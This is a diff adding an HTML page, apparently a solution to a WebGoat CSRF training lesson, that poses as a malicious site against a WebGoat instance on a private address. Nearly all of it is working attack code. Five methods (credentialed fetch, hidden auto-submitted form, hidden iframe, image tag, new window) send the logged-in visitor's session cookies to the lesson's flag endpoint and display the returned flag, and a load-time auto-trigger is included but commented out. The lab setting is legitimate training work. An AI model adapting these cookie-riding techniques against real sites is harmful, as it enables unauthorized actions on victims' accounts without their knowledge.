@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Get Flag</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #333;
+            margin-top: 0;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 15px;
+        }
+        .alert {
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 5px solid;
+        }
+        .alert-info {
+            background: #e3f2fd;
+            border-color: #2196F3;
+            color: #0d47a1;
+        }
+        .alert-warning {
+            background: #fff3e0;
+            border-color: #ff9800;
+            color: #e65100;
+        }
+        .alert-success {
+            background: #e8f5e9;
+            border-color: #4caf50;
+            color: #1b5e20;
+        }
+        .alert-danger {
+            background: #ffebee;
+            border-color: #f44336;
+            color: #b71c1c;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 10px 5px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        #result {
+            margin-top: 25px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            display: none;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .flag-display {
+            background: #4caf50;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            display: none;
+        }
+        .step {
+            background: #f8f9fa;
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 4px solid #667eea;
+            border-radius: 4px;
+        }
+        .step strong {
+            color: #667eea;
+        }
+        code {
+            background: #e8eaf6;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #5e35b1;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 CSRF Attack - Get Flag</h1>
+        
+        <div class="alert alert-warning">
+            <strong>⚠️ Important:</strong> You MUST be logged into WebGoat at 
+            <code>http://192.168.254.112:8001</code> in this same browser for this to work!
+        </div>
+
+        <div class="alert alert-info">
+            <strong>📋 How this works:</strong><br>
+            This page simulates a malicious website that exploits the CSRF vulnerability.
+            When you click the button, it sends a request to WebGoat using your browser's
+            stored session cookie - that's the CSRF attack!
+        </div>
+
+        <h2>🚀 Launch Attack Methods</h2>
+        
+        <div class="step">
+            <strong>Method 1:</strong> Direct fetch with credentials (Recommended)
+            <br><button onclick="method1()">▶️ Attack via Fetch API</button>
+        </div>
+
+        <div class="step">
+            <strong>Method 2:</strong> Create hidden form and auto-submit
+            <br><button onclick="method2()">▶️ Attack via Form Submit</button>
+        </div>
+
+        <div class="step">
+            <strong>Method 3:</strong> Load in hidden iframe
+            <br><button onclick="method3()">▶️ Attack via Iframe</button>
+        </div>
+
+        <div class="step">
+            <strong>Method 4:</strong> Image tag with credentials
+            <br><button onclick="method4()">▶️ Attack via Image Tag</button>
+        </div>
+
+        <div class="step">
+            <strong>Method 5:</strong> Open in new window (manual)
+            <br><button onclick="method5()">▶️ Open Attack URL</button>
+        </div>
+
+        <div id="flag-container" class="flag-display"></div>
+        <div id="result"></div>
+
+        <div class="alert alert-success" id="success-msg" style="display:none;">
+            <strong>✅ Attack Successful!</strong><br>
+            Copy the flag above and paste it into the "Confirm Flag Value" field in WebGoat.
+        </div>
+    </div>
+
+    <script>
+        const TARGET_URL = 'http://192.168.254.112:8001/WebGoat/csrf/basic-get-flag';
+        
+        function showResult(message, isSuccess = false) {
+            const resultDiv = document.getElementById('result');
+            resultDiv.style.display = 'block';
+            resultDiv.style.background = isSuccess ? '#e8f5e9' : '#f5f5f5';
+            resultDiv.textContent = message;
+        }
+
+        function showFlag(flag) {
+            const flagDiv = document.getElementById('flag-container');
+            flagDiv.style.display = 'block';
+            flagDiv.innerHTML = `🎉 FLAG: <span style="font-family: monospace; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px;">${flag}</span>`;
+            document.getElementById('success-msg').style.display = 'block';
+        }
+
+        async function method1() {
+            showResult('🔄 Sending request via Fetch API...');
+            
+            try {
+                const response = await fetch(TARGET_URL, {
+                    method: 'GET',
+                    credentials: 'include',  // This includes cookies!
+                    mode: 'cors',
+                    cache: 'no-cache'
+                });
+                
+                const text = await response.text();
+                showResult(`✅ Response received!\n\nStatus: ${response.status}\n\n${text}`, true);
+                
+                // Try to parse and extract flag
+                try {
+                    const json = JSON.parse(text);
+                    if (json.flag) {
+                        showFlag(json.flag);
+                    }
+                    if (json.lessonCompleted) {
+                        showResult(`✅ Lesson Completed!\n\n${text}`, true);
+                    }
+                } catch (e) {
+                    console.log('Not JSON format');
+                }
+            } catch (error) {
+                showResult(`❌ Error: ${error.message}\n\nMake sure:\n1. You're logged into WebGoat\n2. WebGoat is running at 192.168.254.112:8001\n3. You're on the CSRF lesson page`);
+            }
+        }
+
+        function method2() {
+            showResult('🔄 Creating form and submitting...');
+            
+            // Create a form
+            const form = document.createElement('form');
+            form.method = 'GET';
+            form.action = TARGET_URL;
+            form.target = '_blank';
+            form.style.display = 'none';
+            document.body.appendChild(form);
+            
+            // Submit it
+            form.submit();
+            
+            showResult('✅ Form submitted in new window!\nCheck the new window for the flag, then come back here.', true);
+            
+            setTimeout(() => {
+                form.remove();
+            }, 1000);
+        }
+
+        function method3() {
+            showResult('🔄 Creating hidden iframe...');
+            
+            // Remove existing iframe if any
+            const existingIframe = document.getElementById('csrf-iframe');
+            if (existingIframe) existingIframe.remove();
+            
+            // Create new iframe
+            const iframe = document.createElement('iframe');
+            iframe.id = 'csrf-iframe';
+            iframe.src = TARGET_URL;
+            iframe.style.width = '100%';
+            iframe.style.height = '300px';
+            iframe.style.border = '2px solid #667eea';
+            iframe.style.borderRadius = '8px';
+            iframe.style.marginTop = '20px';
+            
+            iframe.onload = function() {
+                showResult('✅ Iframe loaded! The request was sent.\nCheck the iframe content above or check WebGoat for the flag.', true);
+            };
+            
+            iframe.onerror = function() {
+                showResult('❌ Iframe failed to load. This might be due to CORS restrictions.\nTry Method 1 or Method 5 instead.');
+            };
+            
+            document.body.appendChild(iframe);
+        }
+
+        function method4() {
+            showResult('🔄 Creating image tag (this triggers GET request)...');
+            
+            // Remove existing image if any
+            const existingImg = document.getElementById('csrf-img');
+            if (existingImg) existingImg.remove();
+            
+            // Create image tag
+            const img = new Image();
+            img.id = 'csrf-img';
+            img.style.display = 'none';
+            
+            img.onload = function() {
+                showResult('✅ Image loaded (unlikely, but request was sent)!\nCheck WebGoat for the flag.', true);
+            };
+            
+            img.onerror = function() {
+                showResult('✅ Request sent (image failed to load as expected)!\nThe CSRF attack was triggered. Check WebGoat for the flag.', true);
+                // Even though image fails to load, the GET request was still sent!
+            };
+            
+            img.src = TARGET_URL;
+            document.body.appendChild(img);
+        }
+
+        function method5() {
+            showResult('🔄 Opening URL in new window...');
+            
+            const newWindow = window.open(TARGET_URL, '_blank');
+            
+            if (newWindow) {
+                showResult('✅ New window opened!\nCheck the new window for the JSON response with the flag.\nCopy the flag value and return here to submit it in WebGoat.', true);
+            } else {
+                showResult('❌ Popup blocked!\nPlease allow popups for this page, or try Method 1 instead.');
+            }
+        }
+
+        // Auto-trigger Method 1 on page load (commented out by default)
+        // window.addEventListener('load', () => {
+        //     setTimeout(method1, 1000);
+        // });
+    </script>
+</body>
+</html>
